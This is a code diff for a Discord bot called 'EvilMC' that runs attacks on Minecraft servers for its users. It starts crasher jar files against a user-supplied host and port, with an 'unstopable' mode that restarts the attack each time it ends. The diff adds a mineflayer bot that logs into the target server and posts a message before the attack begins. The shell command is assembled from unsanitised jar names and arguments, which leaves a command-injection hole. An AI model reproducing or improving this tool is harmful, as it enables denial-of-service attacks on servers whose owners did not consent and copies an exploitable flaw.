@@ -2,10 +2,13 @@ const Discord = require('discord.js');
 const Client = require('./client.js');
 const child = require('child_process');
 const killPrc = require('tree-kill');
+const crashers = require('../functions/crashers.js');
+const mineflayer = require('mineflayer');
+const config = require('../jsons/config.json');
 
 class Attack {
     /**
-     * @typedef {{client: Client, interaction: Discord.CommandInteraction, jaroptions: {jarname: string, jarargs: string}, AttacksArray: Discord.Collection<string, Attack>, ownerID: string, msgID: string, embed: Discord.MessageEmbed, host: string, port: string, method: string, unstopable: boolean, crashPrc: child.ChildProcess, pid: Number}} AttackOptions
+     * @typedef {{client: Client, interaction: Discord.CommandInteraction, jaroptions: {jarname: string, jarargs: string}, AttacksArray: Discord.Collection<string, Attack>, ownerID: string, msgID: string, embed: Discord.EmbedBuilder, host: string, port: string, method: string, unstopable: boolean, crashPrc: child.ChildProcess, pid: Number}} AttackOptions
      * @param {AttackOptions} options 
      */
     constructor(options) {
@@ -26,31 +29,79 @@ class Attack {
         this.runAttack();
     }
 
-    runJar() {      
-        let crash = child.exec(`java -jar jars/${this.jaroptions.jarname} ${this.jaroptions.jarargs}`, { detached: true }, (error, stdout, stderr) => {
-            if (stderr) {
-                console.log(`StdErr: ${stderr}`);
-                return;
-            }
-            console.log(`Была запущена атака: ${this.jaroptions.jarname}`)
-            console.log(`[Attack log] ${stdout}`);
-        })
-
-        this.crashPrc = crash;
-        this.pid = crash.pid;
-
-        if (this.unstopable) {
-            crash.on("exit", (code, signal) => {
-                this.runJar();
+    async runJar() {
+        try {
+            let crash = child.exec(`java -jar jars/${this.jaroptions.jarname} ${this.jaroptions.jarargs}`, { detached: true }, (error, stdout, stderr) => {
+                if (stderr) {
+                    console.log(`StdErr: ${stderr}`);
+                    return;
+                }
+                console.log(`[Attack log] ${stdout}`);
             })
+
+            this.crashPrc = crash;
+            this.pid = crash.pid;
+
+            if (this.unstopable) {
+                crash.on("exit", (code, signal) => {
+                    this.runJar();
+                })
+            }
+        } catch (err) {
+            await crashers.errorembed(this.client, this.interaction, this.interaction.commandName, err);
         }
     }
 
-    runAttack() {
-        this.runJar();
+    /**
+     * Отправление сообщения на сервер
+     * @param {String} msg 
+     */
+    async sendMsgToServer(msg) {
+        const bot = mineflayer.createBot({
+            username: config.msgToServer.botName,
+            host: this.host,
+            port: this.port
+        })
 
-        this.embed = new Discord.MessageEmbed()
-            .setColor('RANDOM')
+        bot.on('login', () => {
+            bot.chat(`/register ${config.msgToServer.botPass} ${config.msgToServer.botPass}`);
+            bot.chat(`/login ${config.msgToServer.botPass}`);
+            bot.chat(msg);
+            bot.quit();
+        })
+        
+        bot.on('end', async (reason) => {
+            let runembed;
+            const port = this.port || 25565;
+            console.log(`[LOG] Была запущена атака: ${this.method}\n[LOG] Название jar: ${this.jaroptions.jarname}\n[LOG] Аргументы jar: ${this.jaroptions.jarargs}\n[LOG] Запустил атаку: ${this.ownerID}`);
+            this.runJar();
+    
+            try {
+                if (this.unstopable == false) {
+                    runembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${port} \n \n  ► Атака запущена! ✅ \n ► На 60 секунд!!\n ☆ Made with ♥ by DesConnet ☆`);
+    
+                    this.interaction.editReply({ embeds: [runembed] })
+    
+                    setTimeout(async () => await this.stopAttack(), 60000)
+                } else {
+                    runembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${port} \n \n  ► Атака запущена! ✅ \n ► До тех пор пока вы не нажмете остановить!!\n ☆ Made with ♥ by DesConnet ☆`);
+    
+                    const stopBtn = new Discord.ButtonBuilder()
+                        .setCustomId("stopAttack")
+                        .setLabel("Остановить")
+                        .setStyle("DANGER");
+    
+                    this.interaction.editReply({ embeds: [runembed], components: [new Discord.ActionRowBuilder({ components: [stopBtn] })], fetchReply: true })
+                }
+            } catch (err) {
+                await crashers.errorembed(this.client, this.interaction, this.interaction.commandName, err, true);
+            }
+        })
+    }
+
+    async runAttack() {
+        this.embed = new Discord.EmbedBuilder()
+            .setColor('Random')
             .setFooter({
                 text: `${this.interaction.guild.name} | EvilMC`,
                 iconURL: this.client.user.avatarURL({ dynamic: true })
@@ -58,32 +109,50 @@ class Attack {
 
         let runembed;
 
-        if (this.unstopable == false) {
-            runembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${this.port} \n \n  ► Атака запущена! ✅ \n ► На 60 секунд!!\n ☆ Made with ♥ by DesConnet ☆`);
+        if (config.msgToServer.enable) {
+            runembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${this.port ? this.port : 25565} \n \n  ► Атака запускается... \n ☆ Made with ♥ by DesConnet ☆`);
 
-            this.interaction.reply({ embeds: [runembed] })
-
-            setTimeout(() => this.stopAttack(), 60000)
+            this.interaction.editReply({ embeds: [runembed] })
+            await this.sendMsgToServer(config.msgToServer.msg)
         } else {
-            runembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${this.port} \n \n  ► Атака запущена! ✅ \n ► До тех пор пока вы не нажмете остановить!!\n ☆ Made with ♥ by DesConnet ☆`);
-
-            const stopBtn = new Discord.MessageButton()
-                .setCustomId("stopAttack")
-                .setLabel("Остановить")
-                .setStyle("DANGER");
-
-            this.interaction.reply({ embeds: [runembed], components: [new Discord.MessageActionRow({components: [stopBtn]})], fetchReply: true}).then((msg) => {
-                this.msgID = msg.id;
-            })
+            const port = this.port || 25565;
+            console.log(`[LOG] Была запущена атака: ${this.method}\n[LOG] Название jar: ${this.jaroptions.jarname}\n[LOG] Аргументы jar: ${this.jaroptions.jarargs}\n[LOG] Запустил атаку: ${this.ownerID}`);
+            await this.runJar();
+    
+            try {
+                if (this.unstopable == false) {
+                    runembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${port} \n \n  ► Атака запущена! ✅ \n ► На 60 секунд!!\n ☆ Made with ♥ by DesConnet ☆`);
+    
+                    this.interaction.editReply({ embeds: [runembed] })
+    
+                    setTimeout(async () => await this.stopAttack(), 60000)
+                } else {
+                    runembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${port} \n \n  ► Атака запущена! ✅ \n ► До тех пор пока вы не нажмете остановить!!\n ☆ Made with ♥ by DesConnet ☆`);
+    
+                    const stopBtn = new Discord.ButtonBuilder()
+                        .setCustomId("stopAttack")
+                        .setLabel("Остановить")
+                        .setStyle("DANGER");
+    
+                    this.interaction.editReply({ embeds: [runembed], components: [new Discord.ActionRowBuilder({ components: [stopBtn] })], fetchReply: true })
+                }
+            } catch (err) {
+                await crashers.errorembed(this.client, this.interaction, this.interaction.commandName, err, true);
+            }
         }
     };
 
-    stopAttack() {
-        killPrc(this.pid);
-        const endembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${this.port} \n \n ► Атака Завершена!\n ☆ Made with ♥ by DesConnet ☆`);
-        this.interaction.editReply({ embeds: [endembed], components: [] });
-        this.crashPrc.removeAllListeners();
-        this.AttacksArray.delete(this.host, this);
+    async stopAttack() {
+        console.log(`[LOG] Атака ${this.method} запущенная ${this.ownerID} была остановлена`);
+        try {
+            killPrc(this.pid);
+            const endembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${this.port} \n \n ► Атака Завершена!\n ☆ Made with ♥ by DesConnet ☆`);
+            this.interaction.editReply({ embeds: [endembed], components: [] });
+            this.crashPrc.removeAllListeners();
+            this.AttacksArray.delete(this.msgID, this);
+        } catch (err) {
+            await crashers.errorembed(this.client, this.interaction, this.interaction.commandName, err);
+        }
     };
 }
 
